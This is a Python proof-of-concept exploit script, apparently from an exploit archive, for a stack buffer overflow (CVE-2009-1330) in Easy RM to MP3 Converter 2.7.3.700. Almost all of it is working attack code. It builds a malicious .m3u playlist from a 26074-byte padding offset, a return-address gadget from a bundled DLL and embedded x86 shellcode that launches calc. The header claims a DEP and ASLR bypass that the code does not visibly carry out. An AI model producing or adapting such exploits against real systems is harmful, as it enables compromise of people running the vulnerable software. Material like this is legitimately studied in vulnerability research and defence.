#!/usr/bin/python

# Exploit Title: Easy RM to MP3 Converter 2.7.3.700 (.m3u) File BoF Exploit with Universal DEP+ASLR bypass
# Date: 2019-02-18
# Exploit Author: @sasaga92
# Vendor Homepage: N/A
# Software Link: https://www.exploit-db.com/apps/707414955696c57b71c7f160c720bed5-EasyRMtoMP3Converter.exe
# Version: 2.7.3.700
# Tested on: Windows 10 x64 pro
# CVE : CVE-2009-1330


import sys
import random
import string
import struct

_shellcode =  ("\x31\xdb\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
              "\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
              "\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
              "\x45\x81\x3e\x43\x72\x65\x61\x75\xf2\x81\x7e\x08\x6f\x63\x65\x73"
              "\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
              "\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9\xb1\xff\x53\xe2\xfd\x68\x63\x61"
              "\x6c\x63\x89\xe2\x52\x52\x53\x53\x53\x53\x53\x53\x52\x53\xff\xd7")


def random_word(length):
	return ''.join(random.choice(string.lowercase) for i in range(length))


def generate_file(_name_file, _payload):
	print "[+] Creando Archivo malicioso"
	_name_file = open(_name_file,"w+")
	_name_file.write(_payload)
	_name_file.close()
	print "[+] Payload de {0} bytes generado, exitosamente.".format(len(_payload))

def main():
	_name_exploit = "CVE-2009-1330_EasyRMtoMP3Converter2.7.3.700.m3u"
	_offset_eip = 26074
	_eip = struct.pack("<L",0x1001b058) #push esp # retn 0x1001b058 MSRMfilter03.dll 2 -4 one-reg, stack  esp nonull
	_payload = random_word(_offset_eip)
	_payload += _eip
	_payload += struct.pack("<L",0x90909090)
	_payload += _shellcode
	_payload += 'E' * (1000-len(_payload))
	generate_file(_name_exploit, _payload)

if __name__ == "__main__":
    main()